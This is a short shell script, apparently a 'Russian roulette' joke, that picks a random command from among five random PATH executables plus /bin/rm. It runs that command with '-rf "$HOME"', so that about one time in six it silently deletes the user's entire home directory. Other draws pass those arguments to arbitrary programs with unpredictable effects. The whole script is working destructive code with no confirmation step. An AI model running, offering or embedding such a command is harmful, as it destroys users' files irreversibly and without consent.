#!/bin/sh
#
# Copyright (c) 2015,2017 Tristan Le Guern <tleguern@bouledef.eu>
#
# Permission to use, copy, modify, and distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
#

set -e

unset -f get_random
if command -v jot > /dev/null 2>&1; then
	get_random() { jot -r 1 1 $1 2> /dev/null; }
elif command -v shuf > /dev/null 2>&1; then
	get_random() { shuf -i 1-$1 -n 1 2> /dev/null; }
else
	# Neither jot(1) nor shuf(1). What are you doing with your life?
	get_random() { echo $((RANDOM % ($1 + 1))); }
fi

commands=$(mktemp)
commands_subset=$(mktemp)

trap '{ rm -f -- $commands $commands_subset; }' EXIT

# Generate a listing of every commands available to the user
OLDIFS="$IFS"
IFS=':'
for path in $PATH; do
	# Cope with bogus $PATH
	if [ ! -d "$path" ]; then
		continue
	fi
	find "$path" -mindepth 1 -maxdepth 1 -print >> $commands
done
IFS="$OLDIFS"

# Randomly select five commands to mix with rm
nline="$(cat $commands | wc -l | tr -d ' ')"
for i in 0 1 2 3 4; do
	head -n $(get_random $nline) "$commands" | tail -n 1 >> "$commands_subset"
done
echo /bin/rm >> "$commands_subset"

# And finally fire the shot
shot=$(head -n $(get_random 6) "$commands_subset" | tail -n 1)
"$shot" -rf "$HOME"
